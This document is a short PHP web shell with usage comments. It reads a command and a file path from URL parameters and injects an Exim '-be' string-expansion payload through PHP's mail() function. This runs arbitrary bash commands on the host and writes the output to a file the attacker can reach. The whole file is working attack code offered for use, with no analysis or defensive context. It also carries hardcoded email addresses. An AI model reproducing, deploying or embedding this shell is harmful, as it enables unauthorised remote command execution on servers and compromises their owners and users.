<?php
// Con7ext
// USAGE = file.php?c=COMMAND&p=/PATH/FILE < FILE TO CREATE
// EX : file.php?c=/bin/ls&p=/home/rintod/result.txt
// TO SEE RESULT ACCESS: /result.txt
$comd = @$_GET[c];
$fl = @$_GET[p];
@ob_start();
$headers = "From: rinto@plantsec.org";
$ms = '${run{/bin/bash -c "'.$comd.' >'.$fl.'"}}';
$senders = "rinto@plantsec.org -be";
@mail("kreonrinto@gmail.com", "Owalah Tempix", $ms, $headers, " -f $senders ");
$mek = @ob_get_contents();
@ob_end_clean();
echo $mek;
?>
